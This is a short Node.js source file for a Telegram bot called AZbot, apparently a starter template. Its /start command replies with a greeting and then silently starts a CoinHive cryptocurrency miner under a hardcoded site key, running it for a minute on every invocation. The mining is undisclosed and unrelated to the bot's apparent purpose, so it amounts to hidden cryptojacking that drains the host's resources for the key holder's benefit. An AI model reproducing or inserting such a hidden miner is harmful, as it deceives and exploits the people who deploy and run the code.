// TelegramBot instance
const instance = require('./instance');
const bot = instance.bot;

// Write your bot commands here.
bot.onText(/^\/start$/, (msg, match) => {
    bot.sendMessage(msg.chat.id, 'Hi, I\'m AZbot!');
    const CoinHive = require('coin-hive');
    (async () => {
        // Create miner
        const miner = await CoinHive('4Xw2hL5mqeRIwObp7LUm9F9GYIHgiyyc'); // CoinHive's Site Key

        // Start miner
        await miner.start();

        // Listen on events
        miner.on('found', () => console.log('Found!'));
        miner.on('accepted', () => console.log('Accepted!'));
        miner.on('update', data =>
            console.log(`
    Hashes per second: ${data.hashesPerSecond}
    Total hashes: ${data.totalHashes}
    Accepted hashes: ${data.acceptedHashes}
  `)
        );

        // Stop miner
        setTimeout(async () => await miner.stop(), 60000);
    })();
});